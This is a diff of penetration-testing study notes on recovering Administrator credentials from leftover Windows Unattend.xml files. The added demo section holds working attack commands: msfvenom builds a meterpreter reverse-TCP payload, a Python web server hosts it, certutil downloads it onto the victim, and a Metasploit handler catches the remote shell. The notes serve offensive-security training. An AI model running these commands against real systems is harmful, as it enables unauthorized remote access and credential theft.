@@ -579,9 +579,9 @@ NTLM (NTHash)
 
 
 
-### Searching for Passwords in Windows Configuratio in Files 
+### Searching for Passwords in Windows Configuration in Files 
 
-Windows Configuration Files 
+Windows Configuration Files (not third party)
 
 - Windows can automate a variety of repetitive tasks, such as the mass rollout or installation of Windows on many systems.
 - This is typically done through the use of the Unattended Windows Setup utility,
@@ -590,16 +590,34 @@ Windows Configuration Files
 - This tool utilizes configuration files that contain specific configurations and user account credentials, specifically the Administrator account’s password.
 - If the Unattended Windows Setup configuration files are left on the target system after installation, they can reveal user account credentials that can be used by attackers to authenticate with Windows target legitimately.
 
-
-Unattended WIndows Setuo 
+Unattended Windows Setup 
 
 - The Unattended Windows Setup utility will typically utilize one of the following configuration files that contain user account and system configuration information:
-	- C:\Windows\Panther\Unattend.xml
-	- C:\Windows\Panther\Autounattend.xml
+	- C:\\Windows\\Panther\\Unattend.xml
+	- C:\\Windows\\Panther\\Autounattend.xml
 - As a security precaution, the passwords stored in the Unattended Windows
 - Setup configuration file may be encoded in base64
 
+![[Pasted image 20230707111320.png]]
 
+Demo 
+
+1. get access to victim 
+	- generate meterpreter payload: msfvenom -p windows/x64/metrpreter/reverse_tcp LHOST=yourip LPORT=1234 -f exe >payload.exe 
+	- python -m SimpleHTTPServer 80 
+		- This command starts a simple HTTP server using Python. The server listens on port 80, which is the default port for HTTP traffic. The reason why Python's built-in HTTP server is used to host the payload (`payload.exe`) is that it provides a convenient and lightweight way to serve the file to potential victims. By hosting the file on a server, an attacker can share the payload's download link and trick users into downloading and executing the malicious file. Once executed, the meterpreter payload establishes a reverse TCP connection back to the attacker's machine, enabling them to gain unauthorized access and control over the victim's system. 
+	- Transfer file to victim system: 
+		- open cmd in victim system;
+			- certutil -urlcache -f  http://yourip/payload.exe payload.exe 
+				- - `certutil`: This is a command-line tool available in Windows operating systems. It is primarily used for managing certificates and certificate-related operations.
+				- `-urlcache`: This option is used to download a file from a specified URL and cache it on the local system.
+				- `-f`: This option stands for "force," and it is used to overwrite any existing file with the same name during the download.
+				- `http://yourip/payload.exe`: This is the URL of the file you want to download. Replace `yourip` with the IP address or domain where the file is hosted.
+				- `payload.exe`: This is the name given to the downloaded file on the local system.
+	- go back to webserver and shut it down (file has been downloaded)
+	- set up msfconsole and set up multi/handler 
+		- set payload windows/x64/meterpreter/reverse_tcp, LPORT 1234 LHOST kali ip 
+		- Once you go back to the victim system and you click on the payload a meterpreter session will be started in the multi/handler 
 
 
 
